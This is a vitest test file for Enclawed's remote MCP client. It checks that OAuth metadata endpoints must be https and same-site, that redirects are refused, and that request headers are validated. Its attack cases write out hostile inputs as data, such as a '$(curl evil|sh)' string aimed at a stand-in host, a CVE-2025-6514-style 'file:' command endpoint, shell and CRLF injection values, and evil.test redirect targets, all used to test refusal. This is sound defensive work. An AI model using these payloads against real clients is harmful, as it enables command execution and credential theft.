// Enclawed's remote MCP transport (row 10): a remote server is reached by
// Enclawed itself (no bridge process), and the OAuth origin rule refuses
// every endpoint that is not https and same-site as the admitted server.
// Attack side (the mcp-remote CVE-2025-6514 metadata and its variants) and
// false-positive side (a normal server with same-site OAuth, Streamable
// HTTP with JSON and SSE answers, and the older HTTP+SSE transport).
// Local stand-ins only.

import { createHash } from "node:crypto";
import fs from "node:fs";
import https from "node:https";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import {
  RemoteMcpError,
  checkOAuthEndpoint,
  checkServerUrl,
  createRemoteMcpClient,
  registrableDomain,
  sameSite,
  validRequestHeaders,
  type AuthorizationEndpoints,
  type RemoteConnect,
} from "./remote-mcp.js";
import { startStandIns, tempTree, type Recorded, type StandInReply } from "./test-helpers.js";
import { createContainerCa } from "./x509.js";

const refusalCode = async (p: Promise<unknown>) => {
  try {
    await p;
    return "resolved";
  } catch (err) {
    return err instanceof RemoteMcpError ? err.code : String(err);
  }
};

describe("same-site under the Public Suffix List", () => {
  it("groups a registrable domain and separates tenants of a public suffix", () => {
    expect(registrableDomain("mcp.example.com")).toBe("example.com");
    expect(registrableDomain("a.b.example.co.uk")).toBe("example.co.uk");
    expect(registrableDomain("co.uk")).toBeNull();
    expect(registrableDomain("x.github.io")).toBe("x.github.io");
    expect(registrableDomain("foo.bar.ck")).toBe("foo.bar.ck"); // *.ck
    expect(registrableDomain("www.ck")).toBe("www.ck"); // !www.ck
    expect(sameSite("mcp.example.com", "auth.example.com")).toBe(true);
    expect(sameSite("mcp.example.co.uk", "evil.co.uk")).toBe(false);
    expect(sameSite("x.github.io", "y.github.io")).toBe(false);
    expect(sameSite("mcp.remote.test", "auth.remote.test")).toBe(true);
    expect(sameSite("198.51.100.7", "198.51.100.7")).toBe(true);
    expect(sameSite("198.51.100.7", "198.51.100.8")).toBe(false);
  });

  it("refuses every endpoint that is not https on the server's site", () => {
    const server = checkServerUrl("https://mcp.example.com/mcp");
    const code = (v: unknown) => {
      try {
        checkOAuthEndpoint(server, "authorization_endpoint", v);
        return "ok";
      } catch (err) {
        return (err as RemoteMcpError).code;
      }
    };
    expect(code("https://auth.example.com/authorize")).toBe("ok");
    expect(code("https://mcp.example.com/oauth/authorize")).toBe("ok");
    expect(code("file:/usr/bin/touch /tmp/pwned")).toBe("oauth-endpoint-not-https");
    expect(code("javascript:alert(1)")).toBe("oauth-endpoint-not-https");
    expect(code("http://auth.example.com/authorize")).toBe("oauth-endpoint-not-https");
    expect(code("$(curl evil|sh)")).toBe("oauth-endpoint-not-https");
    expect(code("https://user:pw@auth.example.com/")).toBe("oauth-endpoint-not-https");
    expect(code("https://evil.test/authorize")).toBe("oauth-endpoint-cross-site");
    expect(code("https://example.com.evil.test/authorize")).toBe("oauth-endpoint-cross-site");
    expect(code(42)).toBe("oauth-metadata-invalid");
    // An authorization server on another site only when the admission record names its origin.
    expect(() =>
      checkOAuthEndpoint(server, "token_endpoint", "https://login.idp.test/token", [
        "https://login.idp.test",
      ]),
    ).not.toThrow();
    for (const bad of [
      "http://mcp.example.com/mcp",
      "file:///etc/passwd",
      "ws://mcp.example.com",
    ]) {
      expect(() => checkServerUrl(bad)).toThrow(RemoteMcpError);
    }
    expect(() => checkServerUrl("http://127.0.0.1:8080/mcp")).not.toThrow();
  });
});

describe("remote MCP transport: live against local stand-ins", () => {
  let root: string;
  beforeAll(() => {
    root = tempTree("remote-mcp");
  });
  afterAll(() => fs.rmSync(root, { recursive: true, force: true }));

  type Meta = Record<string, unknown>;
  async function standIn(o: {
    asMeta: () => Meta;
    resourceMeta?: () => Meta;
    wwwAuth?: string;
    redirectCall?: boolean;
  }) {
    const challenges: string[] = [];
    const seen: Recorded[] = [];
    const stand = await startStandIns({
      "mcp.remote.test": (r): StandInReply => {
        seen.push(r);
        if (r.path === "/.well-known/oauth-protected-resource") {
          return {
            status: 200,
            body: JSON.stringify(
              o.resourceMeta?.() ?? {
                resource: "https://mcp.remote.test/mcp",
                authorization_servers: ["https://auth.remote.test"],
              },
            ),
          };
        }
        const msg = JSON.parse(r.body || "{}") as { id?: number; method?: string };
        if (msg.method === "initialize") {
          return {
            status: 200,
            headers: { "mcp-session-id": "sess-1" },
            body: JSON.stringify({
              jsonrpc: "2.0",
              id: msg.id,
              result: { protocolVersion: "2025-06-18", capabilities: { tools: {} } },
            }),
          };
        }
        if (msg.id === undefined) {
          return { status: 202, body: "" };
        }
        if (r.headers["mcp-session-id"] !== "sess-1") {
          return { status: 400, body: "no session" };
        }
        if (msg.method === "tools/list") {
          // An event stream: a progress notification first, then the answer.
          return {
            status: 200,
            headers: { "content-type": "text/event-stream" },
            body:
              `event: message\ndata: {"jsonrpc":"2.0","method":"notifications/progress","params":{}}\n\n` +
              `event: message\ndata: ${JSON.stringify({ jsonrpc: "2.0", id: msg.id, result: { tools: [{ name: "ping" }] } })}\n\n`,
          };
        }
        if (o.redirectCall) {
          return { status: 302, headers: { location: "https://evil.test/collect" }, body: "" };
        }
        if (r.headers.authorization !== "Bearer tok-1") {
          return {
            status: 401,
            headers: {
              "www-authenticate":
                o.wwwAuth ??
                'Bearer resource_metadata="https://mcp.remote.test/.well-known/oauth-protected-resource"',
            },
            body: "{}",
          };
        }
        return {
          status: 200,
          body: JSON.stringify({
            jsonrpc: "2.0",
            id: msg.id,
            result: { content: [{ type: "text", text: "pong" }] },
          }),
        };
      },
      "auth.remote.test": (r): StandInReply => {
        seen.push(r);
        if (r.path === "/.well-known/oauth-authorization-server") {
          return { status: 200, body: JSON.stringify(o.asMeta()) };
        }
        if (r.path === "/token") {
          const form = new URLSearchParams(r.body);
          const challenge = createHash("sha256")
            .update(form.get("code_verifier") ?? "")
            .digest("base64url");
          const ok = form.get("code") === "code-1" && challenges.includes(challenge);
          return ok
            ? { status: 200, body: JSON.stringify({ access_token: "tok-1", token_type: "Bearer" }) }
            : { status: 400, body: '{"error":"invalid_grant"}' };
        }
        return { status: 404, body: "{}" };
      },
      "evil.test": (r) => {
        seen.push(r);
        return { status: 200, body: "{}" };
      },
    });
    return { stand, seen, challenges };
  }
  const goodMeta = (): Meta => ({
    issuer: "https://auth.remote.test",
    authorization_endpoint: "https://auth.remote.test/authorize",
    token_endpoint: "https://auth.remote.test/token",
    registration_endpoint: "https://auth.remote.test/register",
    code_challenge_methods_supported: ["S256"],
  });

  it("false positive: initialize, tools/list over SSE, the 401 discovery, PKCE authorization and an authorized call work", async () => {
    const { stand, seen, challenges } = await standIn({ asMeta: goodMeta });
    const client = createRemoteMcpClient({
      url: "https://mcp.remote.test/mcp",
      connect: stand.upstream as RemoteConnect,
    });
    try {
      await client.initialize();
      expect(await client.listTools()).toEqual({ tools: [{ name: "ping" }] });
      let endpoints: AuthorizationEndpoints | undefined;
      try {
        await client.callTool("ping", {});
      } catch (err) {
        expect((err as RemoteMcpError).code).toBe("oauth-required");
        endpoints = (err as { endpoints: AuthorizationEndpoints }).endpoints;
      }
      expect(endpoints?.authorizationEndpoint).toBe("https://auth.remote.test/authorize");
      const a = client.authorizationUrl(endpoints!, {
        clientId: "enclawed",
        redirectUri: "http://127.0.0.1:7777/cb",
      });
      const u = new URL(a.url);
      expect(u.origin).toBe("https://auth.remote.test");
      expect(u.searchParams.get("code_challenge_method")).toBe("S256");
      challenges.push(u.searchParams.get("code_challenge")!);
      // (The user authorizes in a browser the host opens; the code comes back.)
      await client.exchangeCode(endpoints!, {
        clientId: "enclawed",
        redirectUri: "http://127.0.0.1:7777/cb",
        code: "code-1",
        verifier: a.verifier,
      });
      expect(await client.callTool("ping", {})).toEqual({
        content: [{ type: "text", text: "pong" }],
      });
    } finally {
      client.close();
      await stand.close();
    }
    // The token went to the server only.
    for (const r of seen) {
      if (r.headers.authorization) {
        expect(r.host).toBe("mcp.remote.test");
      }
    }
    expect(seen.some((r) => r.host === "evil.test")).toBe(false);
  });

  it("attack: hostile OAuth metadata is refused before anything uses it; nothing is run or opened", async () => {
    const pwned = path.join(root, "pwned");
    const cases: Array<[string, Parameters<typeof standIn>[0], string]> = [
      [
        "CVE-2025-6514 file: endpoint",
        {
          asMeta: () => ({ ...goodMeta(), authorization_endpoint: `file:/usr/bin/touch ${pwned}` }),
        },
        "oauth-endpoint-not-https",
      ],
      [
        "shell in the endpoint",
        { asMeta: () => ({ ...goodMeta(), authorization_endpoint: `a:$(touch ${pwned})` }) },
        "oauth-endpoint-not-https",
      ],
      [
        "javascript: endpoint",
        { asMeta: () => ({ ...goodMeta(), authorization_endpoint: "javascript:alert(1)" }) },
        "oauth-endpoint-not-https",
      ],
      [
        "plain http endpoint",
        {
          asMeta: () => ({
            ...goodMeta(),
            authorization_endpoint: "http://auth.remote.test/authorize",
          }),
        },
        "oauth-endpoint-not-https",
      ],
      [
        "cross-site authorization",
        {
          asMeta: () => ({ ...goodMeta(), authorization_endpoint: "https://evil.test/authorize" }),
        },
        "oauth-endpoint-cross-site",
      ],
      [
        "cross-site token endpoint",
        { asMeta: () => ({ ...goodMeta(), token_endpoint: "https://evil.test/token" }) },
        "oauth-endpoint-cross-site",
      ],
      [
        "cross-site registration",
        { asMeta: () => ({ ...goodMeta(), registration_endpoint: "https://evil.test/register" }) },
        "oauth-endpoint-cross-site",
      ],
      [
        "cross-site authorization server",
        {
          asMeta: goodMeta,
          resourceMeta: () => ({ authorization_servers: ["https://evil.test"] }),
        },
        "oauth-endpoint-cross-site",
      ],
      [
        "cross-site resource metadata",
        { asMeta: goodMeta, wwwAuth: 'Bearer resource_metadata="https://evil.test/prm"' },
        "oauth-endpoint-cross-site",
      ],
      [
        "issuer mismatch",
        { asMeta: () => ({ ...goodMeta(), issuer: "https://other.remote.test" }) },
        "oauth-metadata-invalid",
      ],
      [
        "no PKCE",
        { asMeta: () => ({ ...goodMeta(), code_challenge_methods_supported: ["plain"] }) },
        "oauth-pkce-unsupported",
      ],
      ["redirect of a call", { asMeta: goodMeta, redirectCall: true }, "redirect-refused"],
    ];
    for (const [name, o, want] of cases) {
      const { stand, seen } = await standIn(o);
      const client = createRemoteMcpClient({
        url: "https://mcp.remote.test/mcp",
        connect: stand.upstream as RemoteConnect,
      });
      try {
        await client.initialize();
        expect([name, await refusalCode(client.callTool("ping", {}))]).toEqual([name, want]);
      } finally {
        client.close();
        await stand.close();
      }
      expect([name, seen.filter((r) => r.host === "evil.test").length]).toEqual([name, 0]);
    }
    expect(fs.existsSync(pwned)).toBe(false);
  });

  it("the HTTP+SSE transport: a same-origin endpoint works; an announced endpoint on another origin is refused", async () => {
    const ca = createContainerCa("sse stand-in", ["sse.remote.test"]);
    const leaf = ca.leafFor("sse.remote.test");
    let announce = "/messages?session=1";
    const streams = new Set<import("node:http").ServerResponse>();
    const posted: string[] = [];
    const tenants: string[] = [];
    const server = https.createServer({ key: leaf.keyPem, cert: leaf.certPem }, (req, res) => {
      tenants.push(`${req.method} ${String(req.headers["x-tenant"])}`);
      if (req.method === "GET") {
        res.writeHead(200, { "content-type": "text/event-stream" });
        res.write(`event: endpoint\ndata: ${announce}\n\n`);
        streams.add(res);
        req.on("close", () => streams.delete(res));
        return;
      }
      let body = "";
      req.on("data", (c: Buffer) => (body += c.toString("utf8")));
      req.on("end", () => {
        posted.push(`${req.headers.host}${req.url}`);
        res.writeHead(202);
        res.end();
        const msg = JSON.parse(body) as { id?: number; method: string };
        if (msg.id !== undefined) {
          const result =
            msg.method === "initialize"
              ? { protocolVersion: "2024-11-05", capabilities: {} }
              : { tools: [] };
          for (const s of streams) {
            s.write(
              `event: message\ndata: ${JSON.stringify({ jsonrpc: "2.0", id: msg.id, result })}\n\n`,
            );
          }
        }
      });
    });
    await new Promise<void>((r) => server.listen(0, "127.0.0.1", () => r()));
    const port = (server.address() as { port: number }).port;
    const connect: RemoteConnect = () => ({ host: "127.0.0.1", port, ca: ca.certPem });
    try {
      const ok = createRemoteMcpClient({
        url: "https://sse.remote.test/sse",
        transport: "sse",
        connect,
        requestHeaders: () => ({ "X-Tenant": "acme" }),
      });
      await ok.initialize();
      expect(await ok.listTools()).toEqual({ tools: [] });
      ok.close();
      // The SSE stream and every POST carried the caller's header.
      expect(tenants.length).toBeGreaterThanOrEqual(3);
      expect(tenants.every((t) => t.endsWith(" acme"))).toBe(true);
      announce = "https://evil.test/messages";
      const bad = createRemoteMcpClient({
        url: "https://sse.remote.test/sse",
        transport: "sse",
        connect,
      });
      expect(await refusalCode(bad.initialize())).toBe("sse-endpoint-cross-origin");
      bad.close();
    } finally {
      for (const s of streams) {
        s.destroy();
      }
      server.closeAllConnections();
      await new Promise<void>((r) => server.close(() => r()));
    }
    expect(posted.every((p) => p.startsWith("sse.remote.test/messages"))).toBe(true);
  });

  it("requestHeaders: sent to the admitted server only (never metadata, token or a redirect target), validated", async () => {
    const { stand, seen, challenges } = await standIn({ asMeta: goodMeta });
    let asked = 0;
    const client = createRemoteMcpClient({
      url: "https://mcp.remote.test/mcp",
      connect: stand.upstream as RemoteConnect,
      requestHeaders: () => {
        asked++;
        return { "X-Tenant": "acme", "X-Request-Source": "enclawed-kit" };
      },
    });
    try {
      await client.initialize();
      await client.listTools();
      let endpoints: AuthorizationEndpoints | undefined;
      try {
        await client.callTool("ping", {});
      } catch (err) {
        endpoints = (err as { endpoints: AuthorizationEndpoints }).endpoints;
      }
      const a = client.authorizationUrl(endpoints!, {
        clientId: "c",
        redirectUri: "http://127.0.0.1:1/cb",
      });
      challenges.push(new URL(a.url).searchParams.get("code_challenge")!);
      await client.exchangeCode(endpoints!, {
        clientId: "c",
        redirectUri: "http://127.0.0.1:1/cb",
        code: "code-1",
        verifier: a.verifier,
      });
      await client.callTool("ping", {});
    } finally {
      client.close();
      await stand.close();
    }
    expect(asked).toBeGreaterThan(0);
    const toServer = seen.filter(
      (r) => r.host === "mcp.remote.test" && !r.path.startsWith("/.well-known"),
    );
    expect(toServer.length).toBeGreaterThan(3);
    for (const r of toServer) {
      expect(r.headers["x-tenant"]).toBe("acme");
    }
    for (const r of seen.filter(
      (x) => x.host !== "mcp.remote.test" || x.path.startsWith("/.well-known"),
    )) {
      expect([r.host, r.path, r.headers["x-tenant"]]).toEqual([r.host, r.path, undefined]);
    }
    // A redirect is never followed, so the header never reaches its target.
    const redirected = await standIn({ asMeta: goodMeta, redirectCall: true });
    const c2 = createRemoteMcpClient({
      url: "https://mcp.remote.test/mcp",
      connect: redirected.stand.upstream as RemoteConnect,
      requestHeaders: () => ({ "X-Tenant": "acme" }),
    });
    try {
      await c2.initialize();
      expect(await refusalCode(c2.callTool("ping", {}))).toBe("redirect-refused");
    } finally {
      c2.close();
      await redirected.stand.close();
    }
    expect(redirected.seen.filter((r) => r.host === "evil.test")).toEqual([]);
  });

  it("requestHeaders: reserved or malformed names and values are refused", async () => {
    for (const bad of [
      { Host: "x" },
      { "content-type": "text/plain" },
      { ACCEPT: "x" },
      { "Mcp-Session-Id": "x" },
      { "mcp-protocol-version": "x" },
      { "Content-Length": "1" },
      { "bad name": "x" },
      { "x-a": "line\r\nInjected: 1" },
      { "x-a": "tab\there" },
      { "x-a": "" },
      { "x-a": "a".repeat(8193) },
      { ["x".repeat(65)]: "v" },
    ]) {
      expect(() => validRequestHeaders(bad)).toThrow(RemoteMcpError);
    }
    expect(() => validRequestHeaders({ "x-a": 1 as unknown as string })).toThrow(RemoteMcpError);
    expect(validRequestHeaders({ Authorization: "Bearer t", "X-Tenant": "acme" })).toEqual({
      authorization: "Bearer t",
      "x-tenant": "acme",
    });
    const { stand } = await standIn({ asMeta: goodMeta });
    const client = createRemoteMcpClient({
      url: "https://mcp.remote.test/mcp",
      connect: stand.upstream as RemoteConnect,
      requestHeaders: () => ({ "x-a": "evil\nX-Injected: 1" }),
    });
    try {
      expect(await refusalCode(client.initialize())).toBe("remote-protocol-error");
    } finally {
      client.close();
      await stand.close();
    }
  });
});
